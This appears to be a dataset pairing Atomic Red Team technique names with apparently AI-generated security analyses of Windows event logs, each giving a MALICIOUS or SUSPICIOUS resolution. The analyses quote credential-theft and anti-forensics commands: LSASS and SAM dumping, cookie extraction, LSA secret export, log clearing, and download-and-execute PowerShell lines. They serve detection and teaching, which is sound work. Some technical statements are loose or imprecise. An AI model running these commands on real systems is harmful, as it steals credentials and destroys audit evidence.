   - The PowerShell logs show a command sequence that includes checking for established network connections on port 3389 (RDP) and creating a memory dump of an associated process using `rundll32.exe` and `comsvcs.dll, MiniDump`. This behavior is suspicious as it could indicate reconnaissance or preparations for privilege escalation by leveraging the ability to capture the memory state of a critical system process.

2. **Security and Event Log Cleared**:
   - In the Security log (Event ID 1102) and the System log (Event ID 104), there are logs indicating that the event logs (""Security,"" ""System,"" and ""Windows PowerShell"") were cleared. Clearing event logs is a common attacker tactic to cover tracks after compromising a system.

3. **Sysmon Logs**:
   - The Sysmon logs reveal the execution of `wevtutil.exe` to clear logs for different channels, matching the logs with clearing of event logs. The execution of `wevtutil` under a high integrity level by the user ""admin_test"" resembles common post-compromise activity aimed at covering tracks.
   - A high integrity level indicates an elevated process, which suggests that the user has administrative privileges.

4. **Use of Privileged Account**:
   - The logs indicate the use of various high-privilege operations by the user ""admin_test"" who possesses SeDebugPrivilege among others. SeDebugPrivilege allows a user to debug processes, which can be exploited to manipulate or inspect other process memory.

5. **Suspicious User Activity**:
   - The user account ""admin_test"" is associated with actions involving NTLM authentication with LogonType 3 (network logon), which is unusual in the context of event log clearance and process handling activities.

**Assessment**:
- The observed behavior within the logs, such as the PowerShell command execution, event log clearing, and use of privileged commands, are strong indicators of post-exploitation activities and attempts at covering tracks.
- The PowerShell command execution, particularly involving the use of network connections and memory dumps, could be indicative of lateral movement or preparation for data exfiltration.
- The clearing of event logs to potentially hide malicious activities strongly suggests an attempt to cover up illicit activities on the system.

**Resolution**: MALICIOUS

**Guidance**:
- Immediate containment of the affected host (Server002) is recommended to prevent further potential compromise or data exfiltration.
- Conduct further investigation to identify any other possibly compromised hosts within the network.
- Perform a thorough review of access records and system changes to trace back the initial point of entry.
- Examine the use and origin of the ""admin_test"" account, as it could be a compromised legitimate account or a planted rogue account.
- Consider the application of threat intelligence and indicator sharing to enhance detection capabilities for similar threats in the future.
- Ensure all logs, especially security-related logs, are securely collected and monitored to prevent tampering."
Export Root Certificate with Export-Certificate,"The Windows event logs presented show activities over a short period with several noteworthy events happening that could potentially indicate malicious behavior. Here's a detailed analysis:

### Detailed Analysis:

1. **Unusual PowerShell Activity:**
   - A PowerShell script is executed, performing certificate-related actions such as creating a self-signed certificate, navigating to the certificate store, and exporting the certificate. This behavior is typical of scripts used for lateral movement or persistence within the Atomic Red Team techniques. The specific command is:
     ```
     ""powershell.exe"" & {$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My, Set-Location Cert:\LocalMachine\My, Export-Certificate -Type CERT -Cert Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath $env:Temp\AtomicRedTeam.cer}
     ```

2. **Clearing of Event Logs:**
   - Numerous instances of `wevtutil.exe` being used to clear event logs on the ""Security"", ""System"", ""Application"", and ""Windows PowerShell"" channels are observed. This behavior is suspicious as it can be used to erase tracks after unauthorized or malicious actions.

3. **Time Manipulation:**
   - There are events indicating system time manipulation. The system time was set back, which can be a tactic to cover tracks or interfere with event log temporal data, making investigations more challenging (`NewTime` set before `OldTime`).

4. **High-Privilege Execution:**
   - Many processes are executed with high integrity levels by the user `admin_test`. Notably, `wevtutil.exe`, typically used by administrators to manage event logs, is run multiple times to clear logs, raising a red flag due to its potential for log tampering.

5. **Suspect User Activity:**
   - The user `admin_test` is involved with high privilege operations that are closely associated with suspect activities (e.g., PowerShell script execution and event log clearing). This suggests either a compromise of the user account or the account being used for unauthorized actions.

### Threats and Risks:

- The combination of potentially malicious PowerShell activity, clearing of important system and security logs, and time alteration is strongly indicative of an attempt to perform tasks that are meant to be concealed, often a part of a sophisticated compromise or breach.
  
### Conclusion:

Upon reviewing the available logs, the activities appear to indicate malicious intent. The use of PowerShell in this manner, coupled with the clearing of logs and time tampering, all point towards behavior typically seen in unauthorized or malicious actions attempting to obscure their tracks.

### Recommended Actions:

- Immediately investigate the `admin_test` user account for any unauthorized access or activities.
- Restore system and application logs from backup, if possible, to ascertain the extent of the alteration.
- Conduct a forensic analysis on ""Server002"" to check for persistence mechanisms or additional malicious scripts.
- Isolate ""Server002"" from the network to prevent further potential spread if it is deemed compromised.

### Resolution:
- **MALICIOUS**: The logs contain clear indicators of malicious activities, and immediate action is required."
Steal Firefox Cookies (Windows),"Upon reviewing the provided logs, several indicators suggest potentially suspicious and likely malicious activity:

1. **Wevtutil.exe Invocations**: 
   - Multiple entries indicate the execution of `wevtutil.exe` to clear event logs (`cl <log_name>`). This activity is commonly associated with attackers attempting to remove traces of their presence on a system.

2. **Log File Clearing**:
   - System logs, Windows PowerShell logs, and Security logs were cleared by the user “admin_test”. Events clearing critical logs (EventID 104 and 1102): 
     - EventID 104 indicates that the System and Windows PowerShell logs were cleared.
     - EventID 1102 indicates that the Security log was cleared.
   - Clearing event logs is a well-known tactic used by malicious actors to cover their tracks.

3. **PowerShell Command**:
   - A PowerShell command was executed involving Firefox cookie extraction:
     ```
     powershell.exe &
     {
        stop-process -name ""firefox"" -force -erroraction silentlycontinue,
        $CookieDBLocation = get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"",
        ""select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];""
        | cmd /c C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe ""$CookieDBLocation""
        | out-file -filepath ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\T1539FirefoxCookies.txt""
     }
     ```
   - This script appears to stop Firefox processes, locate the Firefox cookie database, extract cookie information, and save the output to a local file. This behavior aligns with credential theft or reconnaissance activities.

4. **Tools and Temporary Files**:
   - Usage of SQLite tool (sqlite3.exe) for database access, situated within a path (`C:\Users\ADMIN_~1\AppData\Local\Temp\ExternalPayloads\...`) that implies it may be part of a package or toolset not natively required or present on a Windows system.
   - Mention of `AtomicRedTeam`, a known security testing framework, may indicate either legitimate simulation or active exploitation initially powered by such frameworks.

5. **Integrity Levels and User Context**:
   - Actions performed with a high integrity level under user “SERVER002\admin_test” might indicate possible compromise of the administrator’s account, enabling high-integrity operations necessary for log manipulation and data extraction.

### Conclusion:
Given the activities observed—clearing event logs, executing potentially harmful PowerShell commands, and accessing credential-related data—these activities align heavily with malicious patterns.

**Resolution: MALICIOUS**

### Guidance:
1. **Immediate Response**:
   - Isolate the affected system (Server002) to prevent further spread or damage.
   - Conduct a thorough forensic analysis of the isolated system.
   - Review and block any credentials used by ""admin_test"" until ensured secure.

2. **Further Investigation**:
   - Analyze network traffic logs, if available, during the time frame of suspicious activity for potential external connections/compromises.
   - Investigate the origin and integrity of the PowerShell script and the SQLite database tool usage.

3. **Remediation**:
   - Change all potentially compromised credentials.
   - Restore logs from backups where possible for analysis.
   - Implement monitoring for similar activities across other systems within the network."
esentutl.exe SAM copy,"Upon analyzing the provided Windows event logs, several indicators suggest potential security concerns, specifically suspicious and anomalous activities. Here's a detailed breakdown of the findings:

1. **Log Clearing Activity:**
   - There are multiple instances of the `wevtutil.exe` process (an event log management tool) being executed with the command line argument to clear event logs (`cl`) for different channels such as System, Security, Application, and Windows PowerShell. This activity is suspicious because clearing event logs is a known tactic used to cover tracks after malicious actions.

   - Specifically, the following event log entries indicate log clearing:
     - Sysmon EventID 1 with `CommandLine` like `""C:\\Windows\\system32\\wevtutil.exe\"" cl <log_name>""`.
     - Security Log EventID 1102: Event log cleared for the Security channel.
     - System Log EventID 104: The System and Windows PowerShell logs were cleared.

2. **Privilege Usage:**
   - User `admin_test` (SID `S-1-5-21-3962163828-2803415714-1403596700-1006`) with high privileges like `SeDebugPrivilege`, `SeBackupPrivilege`, and others, which can be indicative of privilege escalation or usage beyond normal operations.

3. **Suspicious Process Execution:**
   - The execution of `esentutl.exe` using `cmd.exe` with specific arguments to work with the `SAM` database looks suspicious. This is a known technique used in password extraction attacks:
     - Sysmon EventID 1 with `CommandLine` like `""cmd.exe"" /c esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM`.

4. **Increased Activity in Short Timeframe:**
   - High activity from `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and several system services in a short period, raising suspicion about scripted or automated sequences of actions.

5. **Network and Credential Access:**
   - There are credential access attempts logged as Event 5379 with return code 3221226021, suggesting possible failed credential access over network services.

**Risk and Threat Assessment:**
- The patterns of log clearing and the execution of potential credential harvesting techniques (through `esentutl.exe`) are clear indicators of malicious intent. Although some processes like `wevtutil.exe` can be used in legitimate scenarios, their usage pattern here is highly indicative of nefarious activities designed to obfuscate actions.

**Guidance on Actions:**
- **Resolution:** MALICIOUS
- **Immediate Action:**
  - Investigate the source and intent of the activities conducted by `admin_test`.
  - Secure any compromised accounts.

Dump LSASS.exe Memory using NanoDump,"Based on the provided Sysmon, Security, System, and Application logs, I have conducted a detailed analysis focusing on elements and behaviors typical of malicious activities such as unusual process execution, access to system utilities, and potential efforts to cover tracks. Here are my findings:

### Suspicious or Anomalous Behavior:

1. **PowerShell Execution:**
   - The process `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` was executed under the user `SERVER002\admin_test`. While PowerShell is a legitimate tool, it can be utilized for malicious purposes. However, the specifics of the command or script are not detailed, so the intent cannot be determined solely from this entry.

2. **Execution of `wevtutil.exe`:**
   - Several instances of `wevtutil.exe` (Eventing Command Line Utility) were executed. Notably, the command lines suggest the clearing of logs, with entries like `wevtutil.exe cl Security`, `wevtutil.exe cl Application`, and `wevtutil.exe cl System`. This behavior is highly suspicious as it indicates a potential attempt to cover tracks by clearing event logs.

3. **Log Cleared Entries:**
   - Security and System logs show events indicating logs were cleared:
     - **Security Log Cleared (EventID 1102):** The `Security` log was cleared by `SERVER002\admin_test`.
     - **System and PowerShell Logs Cleared:** The `System` and `PowerShell` logs were also cleared around the same timeframe by the same user.

4. **Execution of `nanodump.x64.exe`:**
   - A command `cmd.exe /c C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\nanodump.x64.exe -w ""%temp%\nanodump.dmp""` executed `nanodump.x64.exe`. `nanodump` is known for generating LSASS memory dumps, often associated with credential theft activities.

### Assessment:

The activities recorded in these logs strongly suggest an incident involving malicious intent for several reasons:

- The use of `wevtutil.exe` to clear logs is typically employed by adversaries attempting to erase evidence of their activities.
- Executing `nanodump.x64.exe` further indicates potential malicious activity aimed at extracting credentials or other sensitive data from the Local Security Authority Subsystem Service (LSASS).
  
### Conclusion and Recommendations:

**Final Resolution: MALICIOUS**

Given the combination of:
- Log clearing activities,
- Execution of potentially harmful tools like `nanodump.x64.exe`,
- General misuse of system administration utilities such as `wevtutil.exe`,

It is highly likely that these logs document malicious behavior aimed at gaining unauthorized access and covering those tracks.

- **Forensic Analysis:** Conduct a full forensic analysis on Server002, with a particular focus on memory forensics, to identify further traces of the `nanodump` activity and any additional lateral movement.
- **Incident Response:** Engage your organization's Incident Response team to conduct a thorough investigation and implement long-term countermeasures.
- **User Audit:** Review the activities and access of `SERVER002\admin_test` to determine if the account was compromised or misused.
- **Review and Harden Security Policies:** Strengthen monitoring and logging policies, and consider implementing stricter PowerShell execution policies with logging for script executions.

Proceeding with these actions will help mitigate the threat posed by this incident and strengthen the security posture of the affected systems."
Dump credentials from Windows Credential Manager With PowerShell [web Credentials],"### Detailed Analysis of the Logs:

#### Indicators of Suspicious Activity:

1. **Log Clearing**:
   - **Event ID 104** in the System logs shows that logs have been cleared. The system and Windows PowerShell logs were cleared by a user with the username `admin_test`.
   - **Event ID 1102** in the Security logs indicates that these logs were cleared, also by `admin_test`.

2. **Scheduled Task or Update Activities**:
   - The **Sysmon logs** indicate several process creations belonging to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`). These activities are typically benign if associated with legitimate software updates.
   - The processes run under `NT AUTHORITY\SYSTEM`, which aligns with automated updates usually having elevated privileges.

3. **PowerShell Usage**:
   - The **Sysmon log** entry at `""EventRecordID"": ""18005""` shows PowerShell being executed with the command line: `\""powershell.exe\"" & {IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force}`.
   - This PowerShell command downloads and invokes a script from the internet, which is a red flag as it could be used to exfiltrate credential data.

4. **Use of `wevtutil` to Clear Logs**:
   - Multiple instances of `C:\Windows\System32\wevtutil.exe` with the `cl` (clear log) command are observed, indicating an attempt to cover tracks by clearing logs.

#### Assessment:
- The combination of log clearing events and the suspicious PowerShell command suggests malicious activity. The downloading and execution of a PowerShell script from an external source to potentially extract credentials is highly indicative of a breach.
- Although there are some benign system maintenance activities involving Microsoft Edge Update, the presence of potentially malicious PowerShell activity outweighs these benign activities.

#### Resolution:
- **MALICIOUS**: There is clear evidence of malicious activity, notably the execution of remote scripts via PowerShell, attempting to clear multiple system logs, which could point to an attempt at credential harvesting and obfuscation of the intruder’s tracks.

### Recommendations:
1. **Containment**:
   - Immediately isolate the affected system (Server002) from the network to prevent further data exfiltration or compromise.

2. **Eradication**:
   - Conduct an in-depth forensic analysis to determine the extent of the compromise, including a review of network logs and any potential lateral movement.
   - Remove any unauthorized scripts, binaries, or processes found during the investigation.

Dumping LSA Secrets,"Based on the analysis of the provided event logs from the Windows host, the following observations and assessments can be made:

1. **Execution of Suspicious Commands:**
   - There is evidence of the `wevtutil.exe` command-line utility being executed multiple times with the `cl` (clear) parameter targeting various logs, such as Microsoft-Windows-Sysmon/Operational, Application, System, Security, and Windows PowerShell logs. This activity is executed by the user ""SERVER002\\admin_test"".
   - The usage of `wevtutil.exe` with the `cl` command to clear logs is highly suspicious, especially when performed consecutively across multiple important logs without any legitimate reason. This can indicate an attempt to cover tracks after performing malicious activities.

2. **Evidence of Potential Credential Theft:**
   - There is an execution of `cmd.exe` which calls `PsExec.exe` with the command to save registry hives: `""reg save HKLM\\security\\policy\\secrets %%temp%%\\secrets /y""`. This action is often associated with attempts to dump or back up sensitive registry information, possibly related to SAM and LSA secrets which can be leveraged for credential theft.

3. **Clearing of Security Logs:**
   - The Security log has an event with ID 1102, which indicates the security log was cleared by the user ""admin_test"". Coupled with log clearing for System and Application logs, this is a concerning behavior confirming efforts to remove traces of activities.

4. **Windows PowerShell Usage:**
   - The presence of `powershell.exe` execution without a visible command-line argument provides little direct evidence of what was executed. However, the sequence of processes and log clearing points towards potential misuse for administrative tasks or script execution.

5. **Timing and Inter-relation of Events:**
   - The sequence of events associated with clearing logs happen in close succession, supporting the assessment of attempting to obfuscate actions. They all occur just before or near the time to when `PsExec.exe` was executed, adding to the suspicion level.

6. **Standard and Expected Operations:**
   - Other observed processes like `svchost.exe` and `wuauclt.exe` appear to maintain typical behavior such as managing services and Windows updates, not indicative of malicious intent on their own.

### Conclusion:

**Resolution: MALICIOUS**

The combination of registry hive saving via `cmd.exe`, execution clearing by `wevtutil.exe`, and the clearing of logs (Security, System, Windows PowerShell, etc.) implicate a well-coordinated compromise, possibly involving credential access and evidence tampering. These actions are characteristic of a post-exploitation phase where the malicious actor tries to harvest credentials while covering their tracks. 

### Recommendations:

1. **Immediate Isolation:** Disconnect the host from the network to prevent further spread or external communication.
2. **Begin a Forensic Investigation:** Conduct a thorough forensic analysis to ascertain the full scope, methods used, and potential data compromised.
3. **Credential Reset:** Initiate a password reset for any potentially affected accounts, especially ""admin_test"" and any accounts with elevated privileges.
4. **Review and Update Security Protocols:** Ensure auditing is enabled and review security monitoring to detect similar activities in the future.
5. **Malware Scan and Clean-up:** Execute a comprehensive malware scan using updated antivirus signatures to remove any malicious files or tools present.

Send NTLM Hash with RPC Test Connection,"Based on the provided logs, let's break down the analysis into key points:

### Suspicious or Anomalous Behavior Identified in Logs:

1. **Use of `wevtutil.exe`**:
   - The execution of `wevtutil.exe` is observed multiple times across different log entries with command lines like `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, and `cl Security`. This action clears event logs, which is generally suspicious as it might indicate an attempt to hide malicious activities.

2. **Clearing of Logs**:
   - The logs indicate that both ""Security"" and ""System"" event channels were cleared by the user `admin_test`. Event 1102 in the Security log and Event 104 in the System log confirm this. This behavior is typical of attempts to cover tracks.

3. **Execution of `powershell.exe`**:
   - A PowerShell command appears to be running a script involving `rpcping` which checks RPC connectivity or might be part of a network configuration or diagnostic activity. The command is executed by the same user (`SERVER002\\admin_test`) and could be potentially malicious if it is unexpected in the normal flow of operations.

4. **Use of Administrative Level Commands**:
   - The user `admin_test` is running processes at high integrity levels which implies administrative privileges. This is expected for administrative users but in conjunction with log clearing, is suspicious.

5. **Matching User IDs**:
   - All suspicious activities are carried out under the user `SERVER002\\admin_test`, correlating the behaviors noted in process executions and log clearances.

### Assessment of Threat or Risk:

- **Threats**: The combination of clearing event logs, using administrative utilities to query or clear logs, and executing PowerShell scripts are indicators of potential malicious behavior. 
- **Risk**: If this user account is compromised, an attacker may use these techniques to maintain your system access without detection. Additionally, information could be exfiltrated or modified with minimal trace.

### Guidance on How to Proceed:

1. **Immediate Review and Validation**:
   - Verify if these actions by `admin_test` were part of authorized maintenance or administrative scripts. If authorized, ensure there are proper logs and records corresponding to these activities.

2. **Audit and Monitor**:
   - Audit recent changes and administrator activities on the system to ensure this behavior is part of normal operations.
   - Implement tight monitoring on the `admin_test` account and surrounding systems to detect further unusual activities.

3. **Access Review and Possible Credentials Reset**:
   - Review the access and necessity of the `admin_test` account. Consider resetting credentials if suspicious activities persist without explanation.

4. **Enhance Logging and Alerting**:
   - Use more granular logging and alerting for potential malicious tools usage, such as `wevtutil.exe`, especially when used to clear logs.
   - Set alerts for changes in log activity, particularly when logs are being cleared, to enable a quicker response to potential threats.

### Conclusion:

Given the observations and context, the resolution for these logs is **MALICIOUS**. The combination of log clearing, high-level command usage, and the specific PowerShell actions suggest intentional concealment of activities, which aligns with patterns of compromise or unauthorized system access. Immediate follow-up actions are recommended to understand and mitigate any potential impacts."
Create Volume Shadow Copy remotely with WMI,"### Detailed Analysis of Provided Windows Event Logs

1. **Log File Clearance:**
   - **Event ID 1102** in the Security log indicates that the log file was cleared by the user ""admin_test"" on ""SERVER002."" Log clearance, especially of security logs, is often a red flag for malicious activity because adversaries commonly clear logs to hide their tracks.
   - Similar events are observed in the System log (Event ID 104) for multiple channels, including ""System"" and ""Windows PowerShell,"" showing logs were cleared at similar times by the same user.

2. **Shadow Copy and Volume Shadow Service Manipulation:**
   - Multiple events related to `cmd.exe` and `wmic.exe` involving shadow copy operations (Sysmon Event IDs 1) were recorded. The use of the wmci command to list and create shadow copies is not inherently malicious, but this operation's timing correlates closely with log clearance, raising suspicion.

3. **Usage of `wevtutil.exe`:**
   - Several entries show `wevtutil.exe` was used with the `clear` (`cl`) command on numerous log channels, including ""Microsoft-Windows-Sysmon/Operational,"" ""System,"" and ""Windows PowerShell."" This activity suggests someone attempted to clear these logs purposefully.

4. **Process Execution with High Integrity Level:**
   - The processes were executed with a High integrity level, indicative of administrative privileges. While not malicious by itself, coupled with the type of activities (log clearance, shadow copy manipulation), this could indicate privilege misuse.

5. **Microsoft Live Credential Read Failures:**
   - The Security log also shows repeated **Event ID 5379**, indicating attempts to read Microsoft Account credentials, which failed. These rapid, failed attempts might imply an attempt to read credential information improperly.

### Assessment of the Situation

The combination of the following factors points to suspicious activity:
- System and security logs being cleared, especially around the same timeframe.
- Usage of `wevtutil.exe` to clear event logs.
- Specific shadow copy operations in close correlation with log clearances.
- Repeated failed credential read attempts.

### Guidance on How to Proceed
- **Deep Investigative Actions:**
  - Conduct a thorough investigation into ""admin_test"" activities using endpoint detection tools to determine the scope of activity and intention.
  - Review any associated alerts or threats detected by security monitoring systems, such as SIEMs.

- **Immediate Mitigation and Monitoring:**
  - Monitor for further use of administrative tools and suspect commands.
  - Review user permissions and access, particularly for the user ""admin_test.""
  - Inform the incident response team and initiate incident response procedures.

- **Network and Host Threat Hunting:**
  - Conduct deeper network traffic analysis to identify any exfiltration or unusual patterns.
  - Assess other hosts on the network for similar patterns indicating lateral movement.

### Resolution

Considering the evidence of log clearing, use of shadow copy operations, log manipulation, and failed credential access attempts, the resolution for these logs is:

- **SUSPICIOUS** - The logs contain activity that doesn't look right and definitely needs further investigation for potential malicious intent."
Dump LSASS.exe Memory through Silent Process Exit,"The logs provided indicate several suspicious activities that could potentially signify a compromise on the host ""Server002"". Below is a detailed analysis:

1. **Security Log (Event ID 1102)**:
   - This event signifies the clearing of the security log. The action was performed by a user with the username ""admin_test"". Log clearance is a common tactic used by attackers to cover their tracks. The fact that this action occurred is a notable red flag and should be investigated further.

2. **Application Log (Event)**:
   - The application log indicates the execution of a file named `nanodump.x64.exe`. Nanodump is a known tool used for creating process dumps, often used in the context of extracting sensitive information from memory, which is a common attack technique.

3. **Sysmon Log (Event ID 1 and 5)**:
   - There were multiple executions of `wevtutil.exe` to clear logs (""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell""). Like the security log clearing, this indicates an attempt to hide the activities on the host.
   - The execution of `cmd.exe` with a command line that involves `nanodump.x64.exe` further corroborates potential misuse for malicious activities. The use of the term ""AtomicRedTeam"" in the path suggests potential testing or simulation of cyber attacks, but its presence in a production environment without explicit consent could indicate malicious intent.
   - Processes like `powershell.exe` and `wevtutil.exe` running under the ""admin_test"" user account with high integrity levels suggest potential privilege escalation or misuse of administrative credentials.

4. **System Log (Event ID 104)**:
   - Similar to the security log, the system log was also cleared by the same user ""admin_test"". Consistent log-clearing actions across different log channels reinforce the likelihood of malicious activity designed to erase footprints.

**Assessment**:
- The behavior exhibited in the logs — particularly the clearing of multiple event logs, execution of known hacking tools like `nanodump`, and the command-line usage indicative of evasive techniques — strongly suggests malicious activity.
- The simultaneous execution of known administrative tools like `wevtutil` and `powershell` under a high-privilege account supports the theory of systems compromise.

**Resolution**: MALICIOUS

**Guidance**:
1. **Immediate Action**: Isolate the affected host (""Server002"") from the network to prevent further spread or data exfiltration.
2. **Forensic Investigation**: Conduct a deeper forensic analysis to understand the scope and origin of the attack. Review any remaining logs, disk images, and memory captures.
3. **Credential Review**: Immediately review and potentially reset credentials, particularly for the ""admin_test"" user and any other accounts that may have been compromised.
4. **Security Controls**: Enhance monitoring and alerting capabilities to detect similar patterns of behavior in the future, and audit existing security controls to ensure they are robust enough to prevent similar incidents."
Dump LSASS.exe Memory using Out-Minidump.ps1,"In reviewing the provided logs, several items stand out and suggest potential malicious activity:

1. **Suspicious PowerShell Activity**: The Sysmon log contains an entry where `powershell.exe` is executed with a command line that includes downloading and executing a script from `https://github.com/redcanaryco/.../Out-Minidump.ps1`. This script attempts to dump the contents of the LSASS process memory, which is a technique typically used in credential dumping attacks. The command also includes manipulation of PowerShell's execution policy to allow script execution (`IEX (IWR ...) -ErrorAction Stop`). This is a strong indicator of a malicious activity.

2. **Event Log Clearing**: The System log shows entries indicating that event logs, specifically `System`, `Windows PowerShell`, and `Security` logs, have been cleared at `2024-10-20 17:48:35`. The clearing of event logs is a known tactic to cover tracks and hinder forensic investigation, further raising suspicions about malicious intent.

3. **High Integrity Level and wevtutil Commands**: There are numerous instances of `wevtutil.exe` (Windows Event Utility) running with command lines to clear logs, and `conhost.exe` processes initiated subsequently. This combination of actions under a user with a high integrity level (`SERVER002\\admin_test`) and invoking commands that manipulate event logs are often seen in malicious contexts.

Based on the above findings, the following assessment and resolution are put forward:

### Assessment:
- The `powershell.exe` activity aimed at credential dumping from LSASS is highly indicative of malicious behavior.
- The multiple uses of `wevtutil.exe` to clear logs, combined with the suspicious PowerShell activity, suggest an attempt to execute a malicious operation while covering tracks.
- The actions taken align with known attack patterns such as privilege escalation, credential access, and defense evasion.

### Resolution: MALICIOUS

### Guidance on How to Proceed:
1. **Isolate the Machine**: Immediately isolate the affected host (Server002) from the network to prevent further unauthorized access or potential data exfiltration.
2. **Conduct a Full Forensic Investigation**: Acquire memory dumps and a full disk image for forensic analysis to identify the full scope of the compromise.
3. **Review Credentials and Accounts**: Reset passwords for accounts that may have been compromised and review for any unauthorized accounts or permissions.
4. **Enhance Monitoring and Detection**: Implement more stringent monitoring of PowerShell usage, process creation, and event log access on key systems.
5. **Educate and Train Staff**: Increase awareness and training for IT staff on detecting and responding to similar attack patterns in the future.
6. **Patch and Update Systems**: Ensure that all systems are fully patched against known vulnerabilities that may have been exploited. 

This proactive approach will help in mitigating the current compromise and in strengthening defenses against future attacks."
ADFS token signing and encryption certificates theft - Local,"Upon reviewing the event logs provided, several points of interest stand out:

1. **Log Clearing Events:**
   - We observe multiple events indicating the clearing of logs in the Security, System, and Windows PowerShell channels. Specifically:
     - EventID 1102 from the Security log, indicating audit log has been cleared.
     - Multiple EventID 104 entries in the System log indicating that the System and PowerShell logs have been cleared. 
   - These actions were performed by the user ""SERVER002\admin_test"". The clearing of event logs is usually highly suspicious unless performed during routine system maintenance and documented.

2. **Usage of `wevtutil`:**
   - The `wevtutil` command line tool has been used multiple times to clear event logs. This utility is frequently abused by threat actors to cover their tracks after malicious activity.

3. **Anomalous PowerShell Activity:**
   - The PowerShell logs indicate the execution of scripts that import the `AADInternals` module and specific actions pertaining to certificates, potentially targeting Active Directory Federation Services (ADFS) certificates.
   - Execution of PowerShell commands is associated with EventID 600 and shows the use of `Import-Module AADInternals`. This particular module can be used for penetration testing and might pose a threat depending on its usage and context.

4. **Sysmon Anomalies:**
   - Numerous instances of high-integrity level tasks and administrative command line tools (`hostname.exe`, `whoami.exe`) being executed are recorded. While not inherently malicious, these can correlate with reconnaissance activities.
   - No direct evidence of malicious executables; all signed and verified Microsoft tools were logged. However, the frequency and correlation with logs being cleared are suspect.

5. **Installation and Update of Microsoft Edge:**
   - Activities consistent with Microsoft Edge update processes are observed. These actions executed under the `NT AUTHORITY\SYSTEM` context follow the Edge update patterns and do not raise red flags independently.

**Assessment and Resolution:**

Based on the analysis, the activities logged raise a strong suspicion of potential malicious intent due to:

- The clearing of event logs is a red flag as it indicates a possible attempt to erase the audit trail.
- The system-level execution context and the use of high-integrity processes imply possible privilege escalation.
- The PowerShell activity involving `AADInternals` may indicate attempts to access or compromise sensitive Active Directory infrastructure.

Thus, the conclusion is:
- **Resolution: SUSPICIOUS**.

This activity is not definitively concluded to be malicious without further context. Further investigation is recommended to determine:
- The intent and authorization regarding the execution of the `wevtutil` commands and PowerShell scripts.
- If the user `admin_test` performed these actions as part of a legitimate administrative task or if the account may be compromised.
- Network traffic analysis or endpoint detection targeting similar activity for broader scope understanding.

**Guidance on Next Steps:**
- Conduct a thorough review of privilege use surrounding the `admin_test` account.
- Investigate possible anomalies in network logs surrounding the time of log clearance for potential data exfiltration.
- Evaluate the `AADInternals` usage and scripts involved for unauthorized access or information gathering.
- Increase monitoring and alerting on similar behavior patterns across the network."
Dump credentials from Windows Credential Manager With PowerShell [windows Credentials],"Upon analyzing the provided logs, several behaviors indicate potentially malicious activity:

1. **Event Log Clearing (Security & System Logs)**
   - On 2024-10-27 at 21:00:52, multiple log files (Security, System, Windows PowerShell) were cleared by the user `admin_test`. This is often a tactic used by malicious actors to cover their tracks and prevent detection.

2. **Unusual Time Change (Security & System Logs)**
   - The system time was modified backward by a few seconds, as shown in Event IDs 4616 and 1 in the Security and System logs. This alteration of time could be an attempt to manipulate log entries, especially timestamps related to log wiping activities.

3. **Wevtutil Usage (Sysmon Log)**
   - The command-line utility `wevtutil` was used by the `admin_test` user with high integrity level to clear several event logs, including ""Microsoft-Windows-Sysmon/Operational"" and ""Security,"" as evidenced by the CommandLine attributes in the Sysmon logs related to `wevtutil.exe`. Clearing of logs using `wevtutil` is considered suspicious if not performed during regular administrative tasks.

4. **PowerShell Script Execution (Sysmon & PowerShell Logs)**
   - A PowerShell command was executed with high integrity, making an HTTP request to a suspicious URL for a script named `GetCredmanCreds.ps1`. This script, hosted on GitHub, is executed using the command:
     ```
     ""powershell.exe"" & {IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force}
     ```
   - The intent appears to retrieve credential manager data, which is indicative of credential theft tactics.

5. **Process Execution with Suspicious Parentage (Sysmon Log)**
   - `powershell.exe` is executed by `wsmprovhost.exe`, which by itself may not be inherently suspicious but demonstrates consistent privilege level execution under `admin_test`'s context. Given its relation to the malicious PowerShell command, it warrants additional scrutiny.

**Assessment and Recommendation:**
- **Resolution: MALICIOUS**

The observed activities strongly imply malicious intent, particularly given the logs being cleared by `admin_test`, suspicious PowerShell script execution aimed at credential theft, and time manipulation likely attempting log manipulation. Immediate response actions should include:
- Quarantine the affected host (Server002) to prevent further compromise or lateral movement.
- Thoroughly investigate `admin_test`'s actions and credentials for potential compromise.
- Analyze network logs for outbound connections related to data exfiltration.
- Engage in an incident response to contain, eradicate, and recover affected systems.
- Consider notifying security authorities if data breach notifications are applicable."
Password Spray Invoke-DomainPasswordSpray Light,"After analyzing the provided logs, I have identified several anomalies and patterns that suggest potentially malicious activity:

### Analysis:
1. **Clearing Event Logs:**
   - There are multiple instances of event logs being cleared (`EventID 104` for System, Windows PowerShell and `EventID 1102` for Security) by the user `SERVER002\admin_test`. Clearing event logs is often an attempt to cover tracks after unauthorized activity and is a strong indicator of malicious intent.

2. **Suspicious PowerShell Activity:**
   - A PowerShell script `Invoke-dpsLight` is executed, which appears to be used for credential harvesting. The command attempts to authenticate against an LDAP directory entry using a list of usernames and a password (`Spring2020`). If successful, it logs discovered credentials. This behavior indicates malicious scripting that aims to find valid user credentials.

3. **Process Execution and Task Sequence:**
   - The consistent execution of `wevtutil.exe` with the `cl` (clear) command across different event logs corresponds with log clearing activities.
